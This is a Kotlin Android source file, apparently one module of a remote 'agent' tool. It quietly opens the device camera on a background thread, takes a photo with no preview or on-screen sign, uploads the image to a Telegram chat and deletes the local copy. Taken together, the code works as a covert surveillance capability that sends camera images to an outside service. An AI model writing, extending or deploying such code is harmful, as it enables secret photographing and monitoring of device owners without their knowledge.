package com.example.agent.capabilities

import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Size
import androidx.core.content.ContextCompat
import com.example.agent.TelegramClient
import com.example.agent.ErrorReporter
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class CameraCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    private val mainHandler = Handler(Looper.getMainLooper())

    fun takePhoto(front: Boolean = false) {
        if (!hasCameraPermission()) {
            telegram.sendText("❌ Camera permission denied")
            return
        }

        Thread {
            val cameraManager = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = findCameraId(cameraManager, front)
            if (cameraId == null) {
                telegram.sendText("❌ Camera not found")
                return@Thread
            }

            var cameraDevice: CameraDevice? = null
            var captureSession: CameraCaptureSession? = null
            var imageReader: ImageReader? = null
            val latch = CountDownLatch(1)
            var photoFile: File? = null
            var errorMsg: String? = null

            try {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                val sizes = map?.getOutputSizes(ImageFormat.JPEG)
                val size = sizes?.firstOrNull() ?: Size(1920, 1080)

                imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
                imageReader.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            val buffer: ByteBuffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()

                            photoFile = File(ctx.cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                            FileOutputStream(photoFile).use { it.write(bytes) }
                        }
                    } catch (e: Exception) {
                        errorMsg = e.message
                        ErrorReporter.report(e, "CameraCapability")
                    } finally {
                        latch.countDown()
                    }
                }, mainHandler)

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(imageReader!!.surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        captureSession = session
                                        try {
                                            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                            request.addTarget(imageReader!!.surface)
                                            request.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                            session.capture(request.build(), object : CameraCaptureSession.CaptureCallback() {}, mainHandler)
                                        } catch (e: Exception) {
                                             errorMsg = e.message
                                             ErrorReporter.report(e, "CameraCapability")
                                             latch.countDown()
                                         }
                                    }
                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        errorMsg = "Camera session config failed"
                                        latch.countDown()
                                    }
                                },
                                mainHandler
                            )
                         } catch (e: Exception) {
                             errorMsg = e.message
                             ErrorReporter.report(e, "CameraCapability")
                             latch.countDown()
                         }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        cameraDevice = null
                        latch.countDown()
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        cameraDevice = null
                        errorMsg = "Camera error: $error"
                        latch.countDown()
                    }
                }, mainHandler)

                latch.await(10, TimeUnit.SECONDS)

                when {
                    errorMsg != null -> telegram.sendText("❌ Photo failed: $errorMsg")
                    photoFile != null && photoFile!!.exists() -> {
                        telegram.sendPhoto(photoFile!!, "📷 Photo captured")
                        photoFile!!.delete()
                    }
                    else -> telegram.sendText("❌ Photo capture timed out")
                }
             } catch (e: Exception) {
                 telegram.sendText("❌ Camera error: ${e.message}")
                 ErrorReporter.report(e, "CameraCapability")
             } finally {
                try { captureSession?.close() } catch (_: Exception) {}
                try { cameraDevice?.close() } catch (_: Exception) {}
                try { imageReader?.close() } catch (_: Exception) {}
            }
        }.start()
    }

    private fun findCameraId(cameraManager: CameraManager, front: Boolean): String? {
        for (cameraId in cameraManager.cameraIdList) {
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
            if (front && facing == CameraCharacteristics.LENS_FACING_FRONT) return cameraId
            if (!front && facing == CameraCharacteristics.LENS_FACING_BACK) return cameraId
        }
        return cameraManager.cameraIdList.firstOrNull()
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }
}
